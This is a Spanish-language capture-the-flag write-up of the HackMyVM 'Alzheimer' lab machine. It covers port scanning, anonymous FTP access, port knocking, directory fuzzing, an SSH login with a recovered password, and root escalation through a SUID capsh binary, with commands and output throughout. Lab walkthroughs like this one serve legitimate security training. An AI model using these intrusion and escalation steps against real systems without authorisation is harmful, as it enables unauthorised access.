---
title:      "Alzheimer"
excerpt:    "Hoy nos enfrentaremos a otra máquina de *sml*, en la cual realizaremos una técnica nueva para abrir un puerto en el firewall que no está expuesto."
toc:        true
toc_label:  "Tabla de contenidos"
toc_icon:   "key"
header:
  teaser: /assets/images/alzheimer/prev.png
  teaser_home_page: true
  icon: /assets/images/HMV.png
classes:    wide
categories:
  - HackMyVM
tags:  
  - Easy
  - Linux
  - FTP
  - Port knocking
  - SSH
  - SUID
---

![](/assets/images/alzheimer/prev.png){: .align-center}

Hoy nos enfrentaremos a otra máquina de *sml*, en la cual realizaremos una técnica nueva para abrir un puerto en el firewall que no está expuesto.


## Reconocimiento de Puertos

Como siempre, empezaremos averiguando la IP de la máquina víctima y realizando el reconocimiento de puertos con un pequeño [script](https://github.com/KaianPerez/nmapauto.sh) que creé para automatizar este proceso inicial:


~~~bash
❯ sudo ./nmapauto

 [*] La IP de la máquina víctima es 192.168.1.147

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 12:56 CET
Initiating ARP Ping Scan at 12:56
Scanning 192.168.1.147 [1 port]
Completed ARP Ping Scan at 12:56, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:56
Scanning 192.168.1.147 [65535 ports]
Discovered open port 21/tcp on 192.168.1.147
Completed SYN Stealth Scan at 12:56, 2.61s elapsed (65535 total ports)
Nmap scan report for 192.168.1.147
Host is up (0.00014s latency).
Not shown: 65532 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 08:00:27:EF:E8:1C (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds
           Raw packets sent: 65538 (2.884MB) | Rcvd: 65534 (2.621MB)

 [*] Escaneo avanzado de servicios

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 12:56 CET
Nmap scan report for 192.168.1.147
Host is up (0.00020s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.136
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
MAC Address: 08:00:27:EF:E8:1C (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds

 [*] Escaneo completado, se ha generado el fichero InfoPuertos
 ~~~

Solamente tenemos acceso sin contraseña por FTP, vamos a ver qué nos encontramos.


### FTP

~~~
❯ ftp $ip
Connected to 192.168.1.147.
220 (vsFTPd 3.0.3)
Name (192.168.1.147:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get .secretnote.txt -
remote: .secretnote.txt
229 Entering Extended Passive Mode (|||53975|)
150 Opening BINARY mode data connection for .secretnote.txt (93 bytes).
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
226 Transfer complete.
93 bytes received in 00:00 (213.19 KiB/s)
ftp> exit
221 Goodbye.
~~~

Encontramos un fichero oculto y lo leemos. Como podemos ver, básicamente nos habla de una nueva técnica que nunca usamos hasta ahora. Cito lo que nos pone la Wikipedia:

> El golpeo de puertos (del inglés port knocking) es un mecanismo para abrir puertos externamente en un firewall mediante una secuencia preestablecida de intentos de conexión a puertos que se encuentran cerrados. Una vez que el firewall recibe una secuencia de conexión correcta, sus reglas son modificadas para permitir al host que realizó los intentos conectarse a un puerto específico.

De esta forma, la pista nos da la secuencia de puertos para "golpear" y así abrir un nuevo puerto para nuestra IP. Vamos a ello:

~~~~bash         
❯ knock -v 192.168.1.147 1000 2000 3000
hitting tcp 192.168.1.147:1000
hitting tcp 192.168.1.147:2000
hitting tcp 192.168.1.147:3000
~~~~

Ahora realizaremos un nuevo escaneo:

~~~~bash
❯ sudo ./nmapauto

 [*] La IP de la máquina víctima es 192.168.1.147

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 12:56 CET
Initiating ARP Ping Scan at 12:56
Scanning 192.168.1.147 [1 port]
Completed ARP Ping Scan at 12:56, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:56
Scanning 192.168.1.147 [65535 ports]
Discovered open port 80/tcp on 192.168.1.147
Discovered open port 21/tcp on 192.168.1.147
Completed SYN Stealth Scan at 12:56, 2.59s elapsed (65535 total ports)
Nmap scan report for 192.168.1.147
Host is up (0.00034s latency).
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
MAC Address: 08:00:27:EF:E8:1C (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.78 seconds
           Raw packets sent: 65537 (2.884MB) | Rcvd: 65535 (2.621MB)

 [*] Escaneo avanzado de servicios

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 12:56 CET
Nmap scan report for 192.168.1.147
Host is up (0.00017s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.136
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:EF:E8:1C (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds

 [*] Escaneo completado, se ha generado el fichero InfoPuertos
~~~~

Ahora ha aparecido el puerto 80, veamos qué muestra:

~~~~bash
❯ curl $ip
I dont remember where I stored my password :(
I only remember that was into a .txt file...
-medusa

<!---. --- - .... .. -. --. -->
~~~~

El comentario del final, parece morse, si lo decodificamos (teniendo cuidado con los 2 guiones propios del inicio y final del comentario que se juntan con el código) nos da "**NOTHING**". Toca fuzzear.


### Fuzzing

En esta ocasión vamos a utilizar *feroxbuster* para aplicar recursividad de 4 niveles:

~~~bash
❯ feroxbuster -t 200 -x php,txt,html -u http://192.168.1.147

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.1.147
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        5l       27w      132c http://192.168.1.147/
301      GET        7l       12w      185c http://192.168.1.147/admin => http://192.168.1.147/admin/
301      GET        7l       12w      185c http://192.168.1.147/home => http://192.168.1.147/home/
200      GET        2l        7w       34c http://192.168.1.147/home/index.html
301      GET        7l       12w      185c http://192.168.1.147/secret => http://192.168.1.147/secret/
301      GET        7l       12w      185c http://192.168.1.147/secret/home => http://192.168.1.147/secret/home/
200      GET        1l        8w       44c http://192.168.1.147/secret/index.html
200      GET        2l       13w       62c http://192.168.1.147/secret/home/index.html
[####################] - 1m    600000/600000  0s      found:8       errors:0      
[####################] - 1m    120000/120000  1979/s  http://192.168.1.147/ 
[####################] - 1m    120000/120000  1969/s  http://192.168.1.147/admin/ 
[####################] - 1m    120000/120000  1968/s  http://192.168.1.147/home/ 
[####################] - 1m    120000/120000  1992/s  http://192.168.1.147/secret/ 
[####################] - 1m    120000/120000  1995/s  http://192.168.1.147/secret/home/ 
~~~

Encontramos 4 recursos, así que vamos a revisarlos todos:

~~~~bash
❯ curl -L $ip/home
Maybe my pass is at home!
-medusa
                                                                                                                                                                                         
❯ curl -L $ip/admin
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.14.2</center>
</body>
</html>
                                                                                                                                                                                         
❯ curl -L $ip/secret
Maybe my password is in this secret folder?
                                                                                                                                                                                         
❯ curl -L $ip/secret/home
Im trying a lot. Im sure that i will recover my pass!
-medusa
~~~~

Aquí nos quedamos sin más por donde tirar, sin embargo, parece que tenemos un usuario, *medusa*, y si recordamos un poco atrás, en el fichero oculto del FTP había una frase un tanto "curiosa", *Ihavebeenalwayshere!!!*

Vamos a probar a conectarnos por SSH.


### SSH

~~~bash
❯ ssh medusa@$ip
The authenticity of host '192.168.1.147 (192.168.1.147)' can't be established.
ED25519 key fingerprint is SHA256:O2S8HAtlJxSTJJgIQUiIzsbSKX/qj9Thyn38JM6wsBY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.147' (ED25519) to the list of known hosts.
medusa@192.168.1.147's password: 
Linux alzheimer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Oct  3 06:00:36 2020 from 192.168.1.58
medusa@alzheimer:~$ ls
user.txt
medusa@alzheimer:~$ cat user.txt
~~~~

Pues ya tenemos la flag de user, así que toca ir a por la de root.


## Escalada de privilegios

Como hacemos siempre, vamos a mirar la lista de permisos que tenemos para usar privilegios de otro usuario:

~~~bash
medusa@alzheimer:~$ sudo -l
Matching Defaults entries for medusa on alzheimer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User medusa may run the following commands on alzheimer:
    (ALL) NOPASSWD: /bin/id
~~~

Esto no nos lleva a nada, parece un despiste.

Vamos a revisar los ficheros SUID del sistema:

~~~bash
medusa@alzheimer:~$ find / -type f -perm -4000 -ls 2>/dev/null
     1249     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    15846    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
   137057     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
       60     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
     8850    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo
     3888     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
     3415     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
     3562     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
       63     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
       59     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
     3890     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
       62     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
     5584     28 -rwsr-sr-x   1 root     root          26776 Feb  6  2019 /usr/sbin/capsh
~~~

Vemos el binario *capsh* que tiene buena pinta, vamos a echar mano de nuestro amigo <https://gtfobins.github.io/gtfobins/capsh/> para convertirnos en root:

~~~bash
medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --
root@alzheimer:~# cd /root
root@alzheimer:/root# ls
root.txt
root@alzheimer:/root# cat root.txt
~~~

Con esto finalizamos la máquina. Me ha gustado mucho el tema del *Port Knocking*, se me hizo muy asequible y divertida. Dar gracias a *sml* como siempre por su trabajo para la comunidad. Nos vemos en la siguiente.



